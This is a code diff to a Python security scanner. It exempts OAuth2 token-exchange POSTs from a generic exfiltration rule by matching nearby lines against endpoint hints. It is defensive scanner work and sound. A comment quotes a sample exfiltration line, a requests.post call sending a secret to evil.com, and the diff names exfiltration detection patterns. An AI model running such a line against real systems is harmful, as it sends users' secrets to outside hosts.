@@ -1058,6 +1058,29 @@ _SECRET_PLACEHOLDER_CORES = (
     "notasecret", "insertkey", "insertyour", "todo", "fixme", "xxxx", "foobar",
 )
 
+# OAuth2 token exchange looks exactly like exfiltration (a client_secret POSTed
+# outbound), but it's the REQUIRED auth flow. These hints — grant types, token/
+# authorize endpoints, well-known auth hosts — mark a POST as a legitimate OAuth
+# exchange so it isn't graded as a data leak. High-precision: none appear in a
+# plain `requests.post("http://evil.com", data={"secret": key})` exfil.
+_OAUTH_ENDPOINT_HINTS = (
+    "grant_type", "token_url", "token_endpoint", "tokenurl", "tokenendpoint",
+    "/oauth", "oauth2", "openid", "/token", "/authorize", "authorization_code",
+    "client_credentials", "refresh_token", "accounts.google.com/o/oauth2",
+    "login.microsoftonline.com", "github.com/login/oauth", ".well-known/openid",
+)
+
+
+def _looks_like_oauth(lines: list[str], line_num: int) -> bool:
+    """True if the outbound POST at ``line_num`` (1-indexed) is a legitimate OAuth2
+    token exchange — a client_secret / grant_type sent to a token/authorize endpoint
+    — rather than exfiltration. Checks a small window since the URL is often on a
+    nearby line from the POST call."""
+    lo = max(0, line_num - 4)
+    hi = min(len(lines), line_num + 3)
+    window = "\n".join(lines[lo:hi]).lower()
+    return any(h in window for h in _OAUTH_ENDPOINT_HINTS)
+
 
 def _scan_content(
     content: str, file_path: str,
@@ -1218,6 +1241,13 @@ def _scan_content(
         for name, pattern, severity in EXFILTRATION_PATTERNS:
             if pattern.search(line):
                 if _is_allowlisted(file_path, name, allowlist):
+                    continue
+                # OAuth2 token exchange (client_secret/grant_type → token endpoint)
+                # is the required auth flow, not a leak. Relax ONLY the generic
+                # "POST with sensitive data" rule; the stronger critical exfil
+                # patterns (env dump, webhook.site, DNS) are never relaxed.
+                if (name == "HTTP POST with sensitive data"
+                        and _looks_like_oauth(lines, line_num)):
                     continue
                 findings.append(Finding(
                     category="exfiltration",
